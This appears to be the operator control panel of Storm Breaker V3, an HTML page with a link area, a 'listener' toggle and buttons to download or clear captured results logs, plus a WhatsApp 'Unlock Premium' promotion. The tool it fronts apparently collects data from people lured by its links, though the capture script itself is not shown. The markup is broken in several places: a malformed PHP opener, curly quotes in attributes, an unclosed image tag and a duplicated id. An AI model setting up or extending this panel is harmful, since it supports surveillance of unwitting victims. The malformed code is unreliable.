<php?
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name=”viewport” content=”width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <title>Storm Breaker - V3</title>

</head>

<img src="https://i.ibb.co.com/DQ0zPZY/1720860056024.png"

<body id="ourbody" onload="check_new_version()">

<div id="links"></div>


<div class="mt-2 d-flex justify-content-center">
    <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="15" ></textarea>
</div>

<div class="mt-2 d-flex justify-content-center">
	<a href="https://whatsapp.com/channel/0029VamqKCmFsn0Ws3B3Dl0d"><button> Unlock Premium</button></a>
    <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
    <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
    <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
</div>


</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>